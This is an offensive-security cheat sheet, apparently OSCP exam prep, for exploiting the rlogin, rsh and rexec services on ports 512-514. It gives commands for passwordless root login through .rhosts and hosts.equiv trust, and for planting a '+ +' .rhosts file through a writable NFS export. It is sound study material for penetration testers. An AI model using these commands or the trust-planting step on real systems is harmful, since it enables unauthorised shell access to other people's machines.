# 🔧 R-services (rlogin/rsh/rexec) — Ports 512 / 513 / 514

> **Legacy Berkeley "r" trust services** (512 rexec, 513 rlogin, 514 rsh). On OSCP these are a **trust-abuse foothold**: if `~/.rhosts` / `/etc/hosts.equiv` trust your host or user (`+ +` is the classic wildcard trusting every host and user), `rlogin` gives a **passwordless shell**. Otherwise they're a weak-credential surface. Everything is cleartext. Rare, but a clean win on old Unix boxes.

Related: [[SSH]] · [[Credential Attacks]] · [[Linux Privilege Escalation]] · [[NFS]]

---

## 🧠 PORT 512/513/514 → THINK
- **rlogin (513)** → try `rlogin -l root $IP` for **passwordless** login via trust.
- `.rhosts` / `hosts.equiv` with `+ +` = **anyone trusted** → instant shell.
- **rexec (512)** / **rsh (514)** → run commands if trusted.
- Found writable `.rhosts` via [[NFS]]? → **plant trust**, then rlogin.
- Try common users: `root`, and any usernames found elsewhere.

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
nmap -p512,513,514 -sV $IP
```

```bash
which rlogin rsh || sudo apt install rsh-client -y   # client needed on Kali
```

```bash
rlogin -l root $IP                                   # trust login attempt
```
**Verdict:** rlogin drops you to a shell → done. Prompts for password → try creds; else move on.

## ⏱️ ENUMERATE
```bash
rlogin -l root $IP                 # passwordless if trusted
```

```bash
rsh $IP -l root "id"               # run a command via rsh (514)
```

```bash
rsh $IP id                          # as current local user
```

```bash
rexec $IP -l user id                # rexec (512), if client available
```
**Look for:** any command/shell returned without a password → trust misconfig.

## 🗡️ EXPLOIT
- 🟢 **Trust misconfig (`.rhosts`/`hosts.equiv +`) → passwordless rlogin/rsh** as user/root.
- 🟢 **Plant `.rhosts`** via a writable home (NFS/other write primitive) → then rlogin.
- 🟡 **Weak/reused credentials** on the login prompt.
- 🔵 **Cleartext sniffing** (MITM position).

**A) Abuse existing trust:**
```bash
rlogin -l root $IP        # if trusted -> root shell, no password
```

```bash
rsh $IP -l root "id"      # command exec via trust
```
**B) Plant trust via a writable home (e.g., NFS export is rw and UID matches):**
```bash
echo "+ +" > /mnt/nfs/home/victim/.rhosts    # trust everyone/everything
```

```bash
rlogin -l victim $IP                          # now passwordless
```
**After access:** shell as the trusted user (frequently root) → `id`, `sudo -l`, look for keys/creds, check other users' `.rhosts` for lateral trust → [[Linux Privilege Escalation]]. Reuse anything found ([[Credential Attacks]]).

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| rlogin no password | Trusted | you have a shell | foothold |
| `+ +` in a readable `.rhosts` | Wide trust | rlogin as that user | shell |
| Writable `.rhosts` (NFS) | Plant trust | echo `+ +` → rlogin | shell |
| Password prompt only | No trust | try weak/reused creds | maybe shell |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `rlogin`/`rsh` missing | `sudo apt install rsh-client` |
| Password prompt (no trust) | Try reused creds; else move on |
| Connection refused on 513 | Try rsh (514) / rexec (512); service may be partly disabled |
| Trust exists but login fails | Trust may be host-scoped to a specific source IP you can't match |
| No write path to `.rhosts` | Need a write primitive (NFS rw export) first — see [[NFS]] |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** forgetting to **install `rsh-client`** on modern Kali · not trying **`root`** and other enumerated users with rlogin · overlooking the **plant-`.rhosts`** trick when you have a write primitive.
**Reuse:** users from [[Finger]]/[[SMTP]] → rlogin targets; write primitive from [[NFS]] → plant trust; any creds found → reuse. See [[Credential Attacks]].
**Don't miss:** install `rsh-client` · `rlogin -l root $IP` (and other users) · `rsh $IP -l root "id"` · plant `.rhosts` if you have a writable home (NFS) · reuse discovered creds.
**Stop when:** no trust, no write path to `.rhosts`, and no working creds → move on. A shell → work shifts to [[Linux Privilege Escalation]].

## 📇 CHEAT SHEET
```bash
sudo apt install rsh-client -y
```

```bash
nmap -p512,513,514 -sV $IP
```

```bash
rlogin -l root $IP                 # passwordless if trusted
```

```bash
rsh $IP -l root "id"
# plant trust via writable home: echo "+ +" > /mnt/nfs/home/user/.rhosts ; rlogin -l user $IP
```
**Kill shots:** trust misconfig → passwordless rlogin · writable home → plant `.rhosts` → rlogin.
